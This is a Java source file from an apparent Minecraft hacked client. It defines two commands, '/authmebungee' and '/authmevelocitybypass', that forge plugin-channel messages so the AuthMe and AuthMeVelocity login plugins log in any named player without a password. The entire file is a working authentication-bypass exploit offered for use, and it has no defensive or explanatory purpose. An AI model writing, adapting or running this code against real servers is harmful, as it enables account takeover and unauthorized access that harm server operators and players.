package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

/**
 * AuthMe (Bungee) bypass — sends a Plugin Message on bungeecord:main using Java writeUTF framing.
 * Triggers AuthMe BungeeReceiver.performLogin when the server has:
 *  - spigot.yml -> settings.bungeecord: true
 *  - AuthMe -> HooksSettings.BungeeCord: true
 *
 * Usage:
 *   /authmebungee           -> targets your current name
 *   /authmebungee <name>    -> targets a specific exact name
 */
public class AuthMeBungeeBypassCommand extends Command {
    public AuthMeBungeeBypassCommand() {
        super("authmebungee", "Bypasses AuthMe via BungeeCord plugin message");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root
            .executes(ctx -> {
                String self = MinecraftClient.getInstance().getGameProfile().getName();
                send(self);
                Helper.printChatMessage("[AuthMe-Bungee] Payload sent for: " + self);
                return SINGLE_SUCCESS;
            })
            .then(com.mojang.brigadier.builder.RequiredArgumentBuilder
                    .<CommandSource, String>argument("target", StringArgumentType.word())
                    .executes(ctx -> {
                        String target = StringArgumentType.getString(ctx, "target");
                        send(target);
                        Helper.printChatMessage("[AuthMe-Bungee] Payload sent for: " + target);
                        return SINGLE_SUCCESS;
                    })
            );
    }

    private void send(String exactName) {
        // Helper.sendPluginMessage(String channel, Consumer<DataOutput> writer)
        Helper.sendPluginMessage("bungeecord:main", out -> {
            // MUST use writeUTF framing (Java modified-UTF) to match server-side DataInput.readUTF
            out.writeUTF("AuthMe.v2");          // subChannel
            out.writeUTF("perform.login");      // typeId
            out.writeUTF(exactName);             // player name
        });
    }
}

/**
 * AuthMeVelocity bypass — if a server runs an AuthMe-velocity bridge on channel authmevelocity:main
 * that accepts LOGIN,<name> (implementation-dependent). Keep if you specifically target that plugin.
 *
 * Usage:
 *   /authmevelocitybypass
 */
class AuthMeVelocityBypassCommand extends Command {
    public AuthMeVelocityBypassCommand() {
        super("authmevelocitybypass", "Bypasses AuthMeVelocity (if their bridge is active)");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            String name = MinecraftClient.getInstance().getGameProfile().getName();
            Helper.sendPluginMessage("authmevelocity:main", out -> {
                // Keep writeUTF framing as well; adjust strings if the target expects different opcodes
                out.writeUTF("LOGIN");
                out.writeUTF(name);
            });
            Helper.printChatMessage("[AuthMe-Velocity] Payload packet sent!");
            return SINGLE_SUCCESS;
        });
    }
}
